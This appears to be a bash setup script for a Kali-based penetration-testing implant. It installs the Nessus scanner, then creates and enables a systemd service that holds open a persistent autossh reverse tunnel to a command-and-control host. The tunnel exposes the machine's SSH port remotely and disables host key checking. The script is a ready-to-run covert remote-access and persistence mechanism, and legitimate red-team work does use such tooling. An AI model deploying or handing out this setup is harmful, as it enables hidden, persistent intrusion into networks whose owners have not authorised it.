#!/usr/bin/env bash

# Install Nessus
curl --request GET \
  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.6.4-debian10_amd64.deb' \
  --output 'Nessus-10.6.4-debian10_amd64.deb'

yes | dpkg -i Nessus-10.6.4-debian10_amd64.deb

# Install auto-ssh & connection script
touch /lib/systemd/system/c2autossh.service
apt install autossh
cat <<EOF > /lib/systemd/system/c2autossh.service
[Unit]
Description=AutoSSH tunnel to C2
After=network.target
[Service]
Environment="AUTOSSH_GATETIME=0"
User=kali
Group=kali
ExecStart=/usr/bin/autossh -M 11166 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -o "StrictHostKeyChecking no" -i /home/kali/.ssh/id_rsa -R 6667:localhost:22 kali@[ip]
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
EOF

#chown kali:kali /home/kali/.ssh/id_rsa
systemctl enable c2autossh
systemctl start c2autossh
